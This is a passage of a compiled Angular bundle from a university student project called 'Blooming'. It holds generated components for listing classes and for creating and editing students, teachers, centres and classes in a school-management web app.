    consts: [["id", "main-wrapper", "data-layout", "vertical", "data-navbarbg", "skin6", "data-sidebartype", "full", "data-sidebar-position", "fixed", "data-header-position", "fixed", 1, "page-wrapper"], [1, "body-wrapper", 2, "margin-left", "0"], [1, "container-fluid"], [1, "card"], [1, "card-body"], [1, "card-title", "fw-semibold", "mb-4"], [1, "table", "text-nowrap", "mb-0", "align-middle", 2, "background-color", "white", "border-radius", "1em"], [1, "text-dark", "fs-4"], [1, "border-bottom-0"], [4, "ngFor", "ngForOf"], ["href", "/centros/crear-clases", 1, "btn", "btn-secondary"], ["href", "/centros/dashboard", 1, "btn", "btn-secondary"], [1, "py-6", "px-6", "text-center"], [1, "copyright"], ["href", "./centros/editar-clases", 1, "btn", "btn-secondary"], [1, "btn", "btn-danger", 3, "click"]],
    template: function VerClasesCComponent_Template(rf, ctx) {
      if (rf & 1) {
        \u0275\u0275elementStart(0, "div", 0)(1, "div", 1)(2, "div", 2)(3, "div", 2)(4, "div", 2)(5, "div", 3)(6, "div", 4)(7, "h5", 5);
        \u0275\u0275text(8, "Clases");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(9, "div", 3)(10, "div", 4)(11, "table", 6)(12, "thead", 7)(13, "tr")(14, "th", 8);
        \u0275\u0275text(15, "Nombre");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(16, "th", 8);
        \u0275\u0275text(17, "N\xBAAlumnos");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(18, "th", 8);
        \u0275\u0275text(19, "Centro");
        \u0275\u0275elementEnd();
        \u0275\u0275element(20, "th", 8);
        \u0275\u0275elementEnd()();
        \u0275\u0275template(21, VerClasesCComponent_tbody_21_Template, 13, 3, "tbody", 9);
        \u0275\u0275elementEnd()()();
        \u0275\u0275elementStart(22, "a", 10);
        \u0275\u0275text(23, "Crear Clase");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(24, "a", 11);
        \u0275\u0275text(25, "Volver");
        \u0275\u0275elementEnd()()()()();
        \u0275\u0275element(26, "br")(27, "br");
        \u0275\u0275elementStart(28, "div", 12)(29, "p", 13);
        \u0275\u0275text(30, "\xA9 2023 Blooming. Proyecto acad\xE9mico de la Universidad de Alicante .");
        \u0275\u0275elementEnd()()()()();
      }
      if (rf & 2) {
        \u0275\u0275advance(21);
        \u0275\u0275property("ngForOf", ctx.clasesData.clases);
      }
    },
    dependencies: [NgForOf],
    styles: ["\n\n.btn-secondary[_ngcontent-%COMP%] {\n  margin-left: 10px;\n}\n/*# sourceMappingURL=data:application/json;base64,ewogICJ2ZXJzaW9uIjogMywKICAic291cmNlcyI6IFsic3JjL2FwcC9wYWdlcy9jZW50cm9zL3Zlci1jbGFzZXMtYy92ZXItY2xhc2VzLWMuY29tcG9uZW50LmNzcyJdLAogICJzb3VyY2VzQ29udGVudCI6IFsiLmJ0bi1zZWNvbmRhcnkge1xyXG4gICAgbWFyZ2luLWxlZnQ6IDEwcHg7XHJcbn0iXSwKICAibWFwcGluZ3MiOiAiO0FBQUEsQ0FBQztBQUNHLGVBQWE7QUFDakI7IiwKICAibmFtZXMiOiBbXQp9Cg== */"]
  });
  let VerClasesCComponent2 = _VerClasesCComponent;
  return VerClasesCComponent2;
})();

// src/app/pages/centros/crear-alumnos-c/crear-alumnos-c.component.ts
var CrearAlumnosCComponent = /* @__PURE__ */ (() => {
  const _CrearAlumnosCComponent = class _CrearAlumnosCComponent {
  };
  _CrearAlumnosCComponent.\u0275fac = function CrearAlumnosCComponent_Factory(t) {
    return new (t || _CrearAlumnosCComponent)();
  };
  _CrearAlumnosCComponent.\u0275cmp = /* @__PURE__ */ \u0275\u0275defineComponent({
    type: _CrearAlumnosCComponent,
    selectors: [["app-crear-alumnos-c"]],
    decls: 43,
    vars: 0,
    consts: [["id", "main-wrapper", "data-layout", "vertical", "data-navbarbg", "skin6", "data-sidebartype", "full", "data-sidebar-position", "fixed", "data-header-position", "fixed", 1, "page-wrapper"], [1, "body-wrapper", 2, "margin-left", "0"], [1, "container-fluid"], [1, "card"], [1, "card-body"], [1, "card-title", "fw-semibold", "mb-4"], [1, "mb-3"], ["for", "exampleInputEmail1", 1, "form-label"], ["type", "email", "id", "exampleInputEmail1", "aria-describedby", "emailHelp", 1, "form-control"], ["for", "exampleInputPassword1", 1, "form-label"], ["type", "password", "id", "exampleInputPassword1", 1, "form-control"], ["type", "submit", 1, "btn", "btn-secondary"], ["href", "/centros/ver-alumnos", 1, "btn", "btn-secondary"], [1, "py-6", "px-6", "text-center"], [1, "copyright"]],
    template: function CrearAlumnosCComponent_Template(rf, ctx) {
      if (rf & 1) {
        \u0275\u0275elementStart(0, "div", 0)(1, "div", 1)(2, "div", 2)(3, "div", 2)(4, "div", 2)(5, "div", 3)(6, "div", 4)(7, "h5", 5);
        \u0275\u0275text(8, "Crear Alumno");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(9, "div", 3)(10, "div", 4)(11, "form")(12, "div", 6)(13, "label", 7);
        \u0275\u0275text(14, "Nombre");
        \u0275\u0275elementEnd();
        \u0275\u0275element(15, "input", 8);
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(16, "div", 6)(17, "label", 7);
        \u0275\u0275text(18, "Apellidos");
        \u0275\u0275elementEnd();
        \u0275\u0275element(19, "input", 8);
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(20, "div", 6)(21, "label", 9);
        \u0275\u0275text(22, "Usuario");
        \u0275\u0275elementEnd();
        \u0275\u0275element(23, "input", 10);
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(24, "div", 6)(25, "label", 9);
        \u0275\u0275text(26, "Fecha de Nacimiento");
        \u0275\u0275elementEnd();
        \u0275\u0275element(27, "input", 10);
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(28, "div", 6)(29, "label", 9);
        \u0275\u0275text(30, "Clase");
        \u0275\u0275elementEnd();
        \u0275\u0275element(31, "input", 10);
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(32, "div", 6)(33, "label", 9);
        \u0275\u0275text(34, "Centro");
        \u0275\u0275elementEnd();
        \u0275\u0275element(35, "input", 10);
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(36, "button", 11);
        \u0275\u0275text(37, "Aceptar");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(38, "a", 12);
        \u0275\u0275text(39, "Volver");
        \u0275\u0275elementEnd()()()()()()()();
        \u0275\u0275elementStart(40, "div", 13)(41, "p", 14);
        \u0275\u0275text(42, "\xA9 2023 Blooming. Proyecto acad\xE9mico de la Universidad de Alicante .");
        \u0275\u0275elementEnd()()()()();
      }
    },
    dependencies: [\u0275NgNoValidate, NgControlStatusGroup, NgForm],
    styles: ["\n\n.btn-secondary[_ngcontent-%COMP%] {\n  margin-left: 10px;\n}\n/*# sourceMappingURL=data:application/json;base64,ewogICJ2ZXJzaW9uIjogMywKICAic291cmNlcyI6IFsic3JjL2FwcC9wYWdlcy9jZW50cm9zL2NyZWFyLWFsdW1ub3MtYy9jcmVhci1hbHVtbm9zLWMuY29tcG9uZW50LmNzcyJdLAogICJzb3VyY2VzQ29udGVudCI6IFsiLmJ0bi1zZWNvbmRhcnkge1xyXG4gICAgbWFyZ2luLWxlZnQ6IDEwcHg7XHJcbn0iXSwKICAibWFwcGluZ3MiOiAiO0FBQUEsQ0FBQztBQUNHLGVBQWE7QUFDakI7IiwKICAibmFtZXMiOiBbXQp9Cg== */"]
  });
  let CrearAlumnosCComponent2 = _CrearAlumnosCComponent;
  return CrearAlumnosCComponent2;
})();

// src/app/pages/centros/crear-profesores-c/crear-profesores-c.component.ts
var CrearProfesoresCComponent = /* @__PURE__ */ (() => {
  const _CrearProfesoresCComponent = class _CrearProfesoresCComponent {
  };
  _CrearProfesoresCComponent.\u0275fac = function CrearProfesoresCComponent_Factory(t) {
    return new (t || _CrearProfesoresCComponent)();
  };
  _CrearProfesoresCComponent.\u0275cmp = /* @__PURE__ */ \u0275\u0275defineComponent({
    type: _CrearProfesoresCComponent,
    selectors: [["app-crear-profesores-c"]],
    decls: 35,
    vars: 0,
    consts: [["id", "main-wrapper", "data-layout", "vertical", "data-navbarbg", "skin6", "data-sidebartype", "full", "data-sidebar-position", "fixed", "data-header-position", "fixed", 1, "page-wrapper"], [1, "body-wrapper", 2, "margin-left", "0"], [1, "container-fluid"], [1, "card"], [1, "card-body"], [1, "card-title", "fw-semibold", "mb-4"], [1, "mb-3"], ["for", "exampleInputEmail1", 1, "form-label"], ["type", "email", "id", "exampleInputEmail1", "aria-describedby", "emailHelp", 1, "form-control"], ["for", "exampleInputPassword1", 1, "form-label"], ["type", "password", "id", "exampleInputPassword1", 1, "form-control"], ["type", "submit", 1, "btn", "btn-secondary"], ["href", "/centros/ver-profesores", 1, "btn", "btn-secondary"], [1, "py-6", "px-6", "text-center"], [1, "copyright"]],
    template: function CrearProfesoresCComponent_Template(rf, ctx) {
      if (rf & 1) {
        \u0275\u0275elementStart(0, "div", 0)(1, "div", 1)(2, "div", 2)(3, "div", 2)(4, "div", 2)(5, "div", 3)(6, "div", 4)(7, "h5", 5);
        \u0275\u0275text(8, "Crear Profesor");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(9, "div", 3)(10, "div", 4)(11, "form")(12, "div", 6)(13, "label", 7);
        \u0275\u0275text(14, "Nombre");
        \u0275\u0275elementEnd();
        \u0275\u0275element(15, "input", 8);
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(16, "div", 6)(17, "label", 7);
        \u0275\u0275text(18, "Email");
        \u0275\u0275elementEnd();
        \u0275\u0275element(19, "input", 8);
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(20, "div", 6)(21, "label", 9);
        \u0275\u0275text(22, "Centro");
        \u0275\u0275elementEnd();
        \u0275\u0275element(23, "input", 10);
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(24, "div", 6)(25, "label", 9);
        \u0275\u0275text(26, "Clase");
        \u0275\u0275elementEnd();
        \u0275\u0275element(27, "input", 10);
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(28, "button", 11);
        \u0275\u0275text(29, "Aceptar");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(30, "a", 12);
        \u0275\u0275text(31, "Volver");
        \u0275\u0275elementEnd()()()()()()()();
        \u0275\u0275elementStart(32, "div", 13)(33, "p", 14);
        \u0275\u0275text(34, "\xA9 2023 Blooming. Proyecto acad\xE9mico de la Universidad de Alicante .");
        \u0275\u0275elementEnd()()()()();
      }
    },
    dependencies: [\u0275NgNoValidate, NgControlStatusGroup, NgForm],
    styles: ["\n\n.btn-secondary[_ngcontent-%COMP%] {\n  margin-left: 10px;\n}\n/*# sourceMappingURL=data:application/json;base64,ewogICJ2ZXJzaW9uIjogMywKICAic291cmNlcyI6IFsic3JjL2FwcC9wYWdlcy9jZW50cm9zL2NyZWFyLXByb2Zlc29yZXMtYy9jcmVhci1wcm9mZXNvcmVzLWMuY29tcG9uZW50LmNzcyJdLAogICJzb3VyY2VzQ29udGVudCI6IFsiLmJ0bi1zZWNvbmRhcnkge1xyXG4gICAgbWFyZ2luLWxlZnQ6IDEwcHg7XHJcbn0iXSwKICAibWFwcGluZ3MiOiAiO0FBQUEsQ0FBQztBQUNHLGVBQWE7QUFDakI7IiwKICAibmFtZXMiOiBbXQp9Cg== */"]
  });
  let CrearProfesoresCComponent2 = _CrearProfesoresCComponent;
  return CrearProfesoresCComponent2;
})();

// src/app/pages/centros/crear-clases-c/crear-clases-c.component.ts
var CrearClasesCComponent = /* @__PURE__ */ (() => {
  const _CrearClasesCComponent = class _CrearClasesCComponent {
  };
  _CrearClasesCComponent.\u0275fac = function CrearClasesCComponent_Factory(t) {
    return new (t || _CrearClasesCComponent)();
  };
  _CrearClasesCComponent.\u0275cmp = /* @__PURE__ */ \u0275\u0275defineComponent({
    type: _CrearClasesCComponent,
    selectors: [["app-crear-clases-c"]],
    decls: 31,
    vars: 0,
    consts: [["id", "main-wrapper", "data-layout", "vertical", "data-navbarbg", "skin6", "data-sidebartype", "full", "data-sidebar-position", "fixed", "data-header-position", "fixed", 1, "page-wrapper"], [1, "body-wrapper", 2, "margin-left", "0"], [1, "container-fluid"], [1, "card"], [1, "card-body"], [1, "card-title", "fw-semibold", "mb-4"], [1, "mb-3"], ["for", "exampleInputEmail1", 1, "form-label"], ["type", "email", "id", "exampleInputEmail1", "aria-describedby", "emailHelp", 1, "form-control"], ["for", "exampleInputPassword1", 1, "form-label"], ["type", "password", "id", "exampleInputPassword1", 1, "form-control"], ["type", "submit", 1, "btn", "btn-secondary"], ["href", "/centros/ver-clases", 1, "btn", "btn-secondary"], [1, "py-6", "px-6", "text-center"], [1, "copyright"]],
    template: function CrearClasesCComponent_Template(rf, ctx) {
      if (rf & 1) {
        \u0275\u0275elementStart(0, "div", 0)(1, "div", 1)(2, "div", 2)(3, "div", 2)(4, "div", 2)(5, "div", 3)(6, "div", 4)(7, "h5", 5);
        \u0275\u0275text(8, "Crear Clase");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(9, "div", 3)(10, "div", 4)(11, "form")(12, "div", 6)(13, "label", 7);
        \u0275\u0275text(14, "Nombre");
        \u0275\u0275elementEnd();
        \u0275\u0275element(15, "input", 8);
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(16, "div", 6)(17, "label", 7);
        \u0275\u0275text(18, "Centro");
        \u0275\u0275elementEnd();
        \u0275\u0275element(19, "input", 8);
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(20, "div", 6)(21, "label", 9);
        \u0275\u0275text(22, "N\xBA Alumnos");
        \u0275\u0275elementEnd();
        \u0275\u0275element(23, "input", 10);
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(24, "button", 11);
        \u0275\u0275text(25, "Aceptar");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(26, "a", 12);
        \u0275\u0275text(27, "Volver");
        \u0275\u0275elementEnd()()()()()()()();
        \u0275\u0275elementStart(28, "div", 13)(29, "p", 14);
        \u0275\u0275text(30, "\xA9 2023 Blooming. Proyecto acad\xE9mico de la Universidad de Alicante .");
        \u0275\u0275elementEnd()()()()();
      }
    },
    dependencies: [\u0275NgNoValidate, NgControlStatusGroup, NgForm],
    styles: ["\n\n.btn-secondary[_ngcontent-%COMP%] {\n  margin-left: 10px;\n}\n/*# sourceMappingURL=data:application/json;base64,ewogICJ2ZXJzaW9uIjogMywKICAic291cmNlcyI6IFsic3JjL2FwcC9wYWdlcy9jZW50cm9zL2NyZWFyLWNsYXNlcy1jL2NyZWFyLWNsYXNlcy1jLmNvbXBvbmVudC5jc3MiXSwKICAic291cmNlc0NvbnRlbnQiOiBbIi5idG4tc2Vjb25kYXJ5IHtcclxuICAgIG1hcmdpbi1sZWZ0OiAxMHB4O1xyXG59Il0sCiAgIm1hcHBpbmdzIjogIjtBQUFBLENBQUM7QUFDRyxlQUFhO0FBQ2pCOyIsCiAgIm5hbWVzIjogW10KfQo= */"]
  });
  let CrearClasesCComponent2 = _CrearClasesCComponent;
  return CrearClasesCComponent2;
})();

// src/app/pages/admin/editar-alumnos/editar-alumnos.component.ts
var EditarAlumnosComponent = /* @__PURE__ */ (() => {
  const _EditarAlumnosComponent = class _EditarAlumnosComponent {
    constructor(fb, alumnoService, router, activatedRoute) {
      this.fb = fb;
      this.alumnoService = alumnoService;
      this.router = router;
      this.activatedRoute = activatedRoute;
      this.alumnosData = [];
      this.form = this.fb.group({
        ID_Alumno: [""],
        Nombre: [""],
        Apellidos: [""],
        Usuario: [""],
        FechaNacimiento: [""],
        ID_Clase: [""]
      });
    }
    ngOnInit() {
      this.activatedRoute.paramMap.subscribe((params) => {
        this.alumnosData = history.state.alumno;
        this.form.patchValue({
          ID_Alumno: this.alumnosData.ID_Alumno,
          Nombre: this.alumnosData.Nombre,
          Apellidos: this.alumnosData.Apellidos,
          Usuario: this.alumnosData.Usuario,
          FechaNacimiento: this.alumnosData.FechaNacimiento,
          ID_Clase: this.alumnosData.ID_Clase
        });
      });
    }
    actualizarAlumno() {
      if (!this.form.valid) {
        console.log("Errores en el formulario");
      } else {
        this.alumnoService.putAlumno(this.form.value).subscribe((response) => {
          this.router.navigate(["admin/ver-alumnos"]);
        });
      }
    }
  };
  _EditarAlumnosComponent.\u0275fac = function EditarAlumnosComponent_Factory(t) {
    return new (t || _EditarAlumnosComponent)(\u0275\u0275directiveInject(FormBuilder), \u0275\u0275directiveInject(AlumnoService), \u0275\u0275directiveInject(Router), \u0275\u0275directiveInject(ActivatedRoute));
  };
  _EditarAlumnosComponent.\u0275cmp = /* @__PURE__ */ \u0275\u0275defineComponent({
    type: _EditarAlumnosComponent,
    selectors: [["app-editar-alumnos"]],
    decls: 39,
    vars: 1,
    consts: [["id", "main-wrapper", "data-layout", "vertical", "data-navbarbg", "skin6", "data-sidebartype", "full", "data-sidebar-position", "fixed", "data-header-position", "fixed", 1, "page-wrapper"], [1, "body-wrapper", 2, "margin-left", "0"], [1, "container-fluid"], [1, "card"], [1, "card-body"], [1, "card-title", "fw-semibold", "mb-4"], [3, "formGroup"], [1, "mb-3"], ["for", "Nombre", 1, "form-label"], ["formControlName", "Nombre", "id", "Nombre", 1, "form-control"], ["for", "Apellidos", 1, "form-label"], ["formControlName", "Apellidos", "id", "Apellidos", 1, "form-control"], ["for", "Usuario", 1, "form-label"], ["formControlName", "Usuario", "id", "Usuario", 1, "form-control"], ["for", "FechaNacimiento", 1, "form-label"], ["formControlName", "FechaNacimiento", "id", "FechaNacimiento", 1, "form-control"], ["for", "ID_Clase", 1, "form-label"], ["formControlName", "ID_Clase", "id", "ID_Clase", 1, "form-control"], [1, "btn", "btn-danger", 3, "click"], ["routerLink", "/admin/ver-alumnos", 1, "btn", "btn-danger"], [1, "py-6", "px-6", "text-center"], [1, "copyright"]],
    template: function EditarAlumnosComponent_Template(rf, ctx) {
      if (rf & 1) {
        \u0275\u0275elementStart(0, "div", 0)(1, "div", 1)(2, "div", 2)(3, "div", 2)(4, "div", 2)(5, "div", 3)(6, "div", 4)(7, "h5", 5);
        \u0275\u0275text(8, "Editar Alumno");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(9, "div", 3)(10, "div", 4)(11, "form", 6)(12, "div", 7)(13, "label", 8);
        \u0275\u0275text(14, "Nombre");
        \u0275\u0275elementEnd();
        \u0275\u0275element(15, "input", 9);
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(16, "div", 7)(17, "label", 10);
        \u0275\u0275text(18, "Apellidos");
        \u0275\u0275elementEnd();
        \u0275\u0275element(19, "input", 11);
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(20, "div", 7)(21, "label", 12);
        \u0275\u0275text(22, "Usuario");
        \u0275\u0275elementEnd();
        \u0275\u0275element(23, "input", 13);
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(24, "div", 7)(25, "label", 14);
        \u0275\u0275text(26, "Fecha de Nacimiento");
        \u0275\u0275elementEnd();
        \u0275\u0275element(27, "input", 15);
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(28, "div", 7)(29, "label", 16);
        \u0275\u0275text(30, "Clase");
        \u0275\u0275elementEnd();
        \u0275\u0275element(31, "input", 17);
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(32, "button", 18);
        \u0275\u0275listener("click", function EditarAlumnosComponent_Template_button_click_32_listener() {
          return ctx.actualizarAlumno();
        });
        \u0275\u0275text(33, "Aceptar");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(34, "a", 19);
        \u0275\u0275text(35, "Volver");
        \u0275\u0275elementEnd()()()()()()()();
        \u0275\u0275elementStart(36, "div", 20)(37, "p", 21);
        \u0275\u0275text(38, "\xA9 2023 Blooming. Proyecto acad\xE9mico de la Universidad de Alicante .");
        \u0275\u0275elementEnd()()()()();
      }
      if (rf & 2) {
        \u0275\u0275advance(11);
        \u0275\u0275property("formGroup", ctx.form);
      }
    },
    dependencies: [RouterLink, \u0275NgNoValidate, DefaultValueAccessor, NgControlStatus, NgControlStatusGroup, FormGroupDirective, FormControlName],
    styles: ["\n\n/*# sourceMappingURL=data:application/json;base64,ewogICJ2ZXJzaW9uIjogMywKICAic291cmNlcyI6IFtdLAogICJzb3VyY2VzQ29udGVudCI6IFtdLAogICJtYXBwaW5ncyI6ICIiLAogICJuYW1lcyI6IFtdCn0K */"]
  });
  let EditarAlumnosComponent2 = _EditarAlumnosComponent;
  return EditarAlumnosComponent2;
})();

// src/app/pages/admin/editar-centros/editar-centros.component.ts
var EditarCentrosComponent = /* @__PURE__ */ (() => {
  const _EditarCentrosComponent = class _EditarCentrosComponent {
    constructor(fb, centroService, router, activatedRoute) {
      this.fb = fb;
      this.centroService = centroService;
      this.router = router;
      this.activatedRoute = activatedRoute;
      this.centrosData = [];
      this.form = this.fb.group({
        ID_Centro: [""],
        Nombre: [""],
        Email: ["", [Validators.email]],
        Calle: [""],
        CP: [""],
        Localidad: [""],
        Provincia: [""]
      });
    }
    ngOnInit() {
      this.activatedRoute.paramMap.subscribe((params) => {
        this.centrosData = history.state.centro;
        this.form.patchValue({
          ID_Centro: this.centrosData.ID_Centro,
          Nombre: this.centrosData.Nombre,
          Email: this.centrosData.Email,
          Calle: this.centrosData.Calle,
          CP: this.centrosData.CP,
          Localidad: this.centrosData.Localidad,
          Provincia: this.centrosData.Provincia
        });
      });
    }
    actualizarCentro() {
      if (!this.form.valid) {
        console.log("Errores en el formulario");
      } else {
        this.centroService.putCentro(this.form.value).subscribe((response) => {
          this.router.navigate(["admin/ver-centros"]);
        });
      }
    }
  };
  _EditarCentrosComponent.\u0275fac = function EditarCentrosComponent_Factory(t) {
    return new (t || _EditarCentrosComponent)(\u0275\u0275directiveInject(FormBuilder), \u0275\u0275directiveInject(CentroService), \u0275\u0275directiveInject(Router), \u0275\u0275directiveInject(ActivatedRoute));
  };
  _EditarCentrosComponent.\u0275cmp = /* @__PURE__ */ \u0275\u0275defineComponent({
    type: _EditarCentrosComponent,
    selectors: [["app-editar-centros"]],
    decls: 43,
    vars: 1,
    consts: [["id", "main-wrapper", "data-layout", "vertical", "data-navbarbg", "skin6", "data-sidebartype", "full", "data-sidebar-position", "fixed", "data-header-position", "fixed", 1, "page-wrapper"], [1, "body-wrapper", 2, "margin-left", "0"], [1, "container-fluid"], [1, "card"], [1, "card-body"], [1, "card-title", "fw-semibold", "mb-4"], [3, "formGroup"], [1, "mb-3"], ["for", "Nombre", 1, "form-label"], ["formControlName", "Nombre", "id", "Nombre", 1, "form-control"], ["for", "Email", 1, "form-label"], ["type", "email", "formControlName", "Email", 1, "form-control"], ["for", "Calle", 1, "form-label"], ["formControlName", "Calle", "id", "Calle", 1, "form-control"], ["for", "CP", 1, "form-label"], ["formControlName", "CP", "id", "CP", 1, "form-control"], ["for", "Localidad", 1, "form-label"], ["formControlName", "Localidad", "id", "Localidad", 1, "form-control"], ["for", "Provincia", 1, "form-label"], ["formControlName", "Provincia", "id", "Provincia", 1, "form-control", "d-inline-block"], [1, "btn", "btn-danger", 3, "click"], ["routerLink", "/admin/ver-centros", 1, "btn", "btn-danger"], [1, "py-6", "px-6", "text-center"], [1, "copyright"]],
    template: function EditarCentrosComponent_Template(rf, ctx) {
      if (rf & 1) {
        \u0275\u0275elementStart(0, "div", 0)(1, "div", 1)(2, "div", 2)(3, "div", 2)(4, "div", 2)(5, "div", 3)(6, "div", 4)(7, "h5", 5);
        \u0275\u0275text(8, "Editar Centro");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(9, "div", 3)(10, "div", 4)(11, "form", 6)(12, "div", 7)(13, "label", 8);
        \u0275\u0275text(14, "Nombre");
        \u0275\u0275elementEnd();
        \u0275\u0275element(15, "input", 9);
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(16, "div", 7)(17, "label", 10);
        \u0275\u0275text(18, "Email");
        \u0275\u0275elementEnd();
        \u0275\u0275element(19, "input", 11);
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(20, "div", 7)(21, "label", 12);
        \u0275\u0275text(22, "Calle");
        \u0275\u0275elementEnd();
        \u0275\u0275element(23, "input", 13);
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(24, "div", 7)(25, "label", 14);
        \u0275\u0275text(26, "C\xF3igo Postal");
        \u0275\u0275elementEnd();
        \u0275\u0275element(27, "input", 15);
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(28, "div", 7)(29, "label", 16);
        \u0275\u0275text(30, "Localidad");
        \u0275\u0275elementEnd();
        \u0275\u0275element(31, "input", 17);
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(32, "div", 7)(33, "label", 18);
        \u0275\u0275text(34, "Provincia");
        \u0275\u0275elementEnd();
        \u0275\u0275element(35, "input", 19);
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(36, "button", 20);
        \u0275\u0275listener("click", function EditarCentrosComponent_Template_button_click_36_listener() {
          return ctx.actualizarCentro();
        });
        \u0275\u0275text(37, "Aceptar");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(38, "a", 21);
        \u0275\u0275text(39, "Volver");
        \u0275\u0275elementEnd()()()()()()()();
        \u0275\u0275elementStart(40, "div", 22)(41, "p", 23);
        \u0275\u0275text(42, "\xA9 2023 Blooming. Proyecto acad\xE9mico de la Universidad de Alicante .");
        \u0275\u0275elementEnd()()()()();
      }
      if (rf & 2) {
        \u0275\u0275advance(11);
        \u0275\u0275property("formGroup", ctx.form);
      }
    },
    dependencies: [RouterLink, \u0275NgNoValidate, DefaultValueAccessor, NgControlStatus, NgControlStatusGroup, FormGroupDirective, FormControlName],
    styles: ["\n\n.card-body[_ngcontent-%COMP%] {\n  -webkit-box-flex: 1;\n  -ms-flex: 1 1 auto;\n  flex: 1 1 auto;\n  padding: 20px 20px;\n  color: var(--bs-card-color);\n}\n/*# sourceMappingURL=data:application/json;base64,ewogICJ2ZXJzaW9uIjogMywKICAic291cmNlcyI6IFsic3JjL2FwcC9wYWdlcy9hZG1pbi9lZGl0YXItY2VudHJvcy9lZGl0YXItY2VudHJvcy5jb21wb25lbnQuY3NzIl0sCiAgInNvdXJjZXNDb250ZW50IjogWyIuY2FyZC1ib2R5IHtcclxuICAgIC13ZWJraXQtYm94LWZsZXg6IDE7XHJcbiAgICAtbXMtZmxleDogMSAxIGF1dG87XHJcbiAgICBmbGV4OiAxIDEgYXV0bztcclxuICAgIHBhZGRpbmc6IDIwcHggMjBweDtcclxuICAgIGNvbG9yOiB2YXIoLS1icy1jYXJkLWNvbG9yKTtcclxufSJdLAogICJtYXBwaW5ncyI6ICI7QUFBQSxDQUFDO0FBQ0csb0JBQWtCO0FBQ2xCLFlBQVUsRUFBRSxFQUFFO0FBQ2QsUUFBTSxFQUFFLEVBQUU7QUFDVixXQUFTLEtBQUs7QUFDZCxTQUFPLElBQUk7QUFDZjsiLAogICJuYW1lcyI6IFtdCn0K */"]
  });
  let EditarCentrosComponent2 = _EditarCentrosComponent;
  return EditarCentrosComponent2;
})();

// src/app/pages/admin/editar-clases/editar-clases.component.ts
var EditarClasesComponent = /* @__PURE__ */ (() => {
  const _EditarClasesComponent = class _EditarClasesComponent {
    constructor(fb, claseService, router, activatedRoute) {
      this.fb = fb;
      this.claseService = claseService;
      this.router = router;
      this.activatedRoute = activatedRoute;
      this.clasesData = [];
      this.form = this.fb.group({
        ID_Clase: [""],
        Nombre: [""],
        ID_Centro: [""],
        NumAlumnos: [""]
      });
    }
    ngOnInit() {
      this.activatedRoute.paramMap.subscribe((params) => {
        this.clasesData = history.state.clase;
        this.form.patchValue({
          ID_Clase: this.clasesData.ID_Clase,
          Nombre: this.clasesData.Nombre,
          ID_Centro: this.clasesData.ID_Centro,
          NumAlumnos: this.clasesData.NumAlumnos
        });
      });
    }
    actualizarClase() {
      if (!this.form.valid) {
        console.log("Errores en el formulario");
      } else {
        this.claseService.putClase(this.form.value).subscribe((response) => {
          this.router.navigate(["admin/ver-clases"]);
        });
      }
    }
  };
  _EditarClasesComponent.\u0275fac = function EditarClasesComponent_Factory(t) {
    return new (t || _EditarClasesComponent)(\u0275\u0275directiveInject(FormBuilder), \u0275\u0275directiveInject(ClaseService), \u0275\u0275directiveInject(Router), \u0275\u0275directiveInject(ActivatedRoute));
  };
  _EditarClasesComponent.\u0275cmp = /* @__PURE__ */ \u0275\u0275defineComponent({
    type: _EditarClasesComponent,
    selectors: [["app-editar-clases"]],
    decls: 31,
    vars: 1,
    consts: [["id", "main-wrapper", "data-layout", "vertical", "data-navbarbg", "skin6", "data-sidebartype", "full", "data-sidebar-position", "fixed", "data-header-position", "fixed", 1, "page-wrapper"], [1, "body-wrapper", 2, "margin-left", "0"], [1, "container-fluid"], [1, "card"], [1, "card-body"], [1, "card-title", "fw-semibold", "mb-4"], [3, "formGroup"], [1, "mb-3"], ["for", "Nombre", 1, "form-label"], ["formControlName", "Nombre", "id", "Nombre", 1, "form-control"], ["for", "ID_Centro", 1, "form-label"], ["formControlName", "ID_Centro", "id", "ID_Centro", 1, "form-control"], ["for", "NumAlumnos", 1, "form-label"], ["formControlName", "NumAlumnos", "id", "NumAlumnos", 1, "form-control"], [1, "btn", "btn-danger", 3, "click"], ["routerLink", "/admin/ver-clases", 1, "btn", "btn-danger"], [1, "py-6", "px-6", "text-center"], [1, "copyright"]],
    template: function EditarClasesComponent_Template(rf, ctx) {
      if (rf & 1) {
        \u0275\u0275elementStart(0, "div", 0)(1, "div", 1)(2, "div", 2)(3, "div", 2)(4, "div", 2)(5, "div", 3)(6, "div", 4)(7, "h5", 5);
        \u0275\u0275text(8, "Editar Clase");
        \u0275\u0275elementEnd();
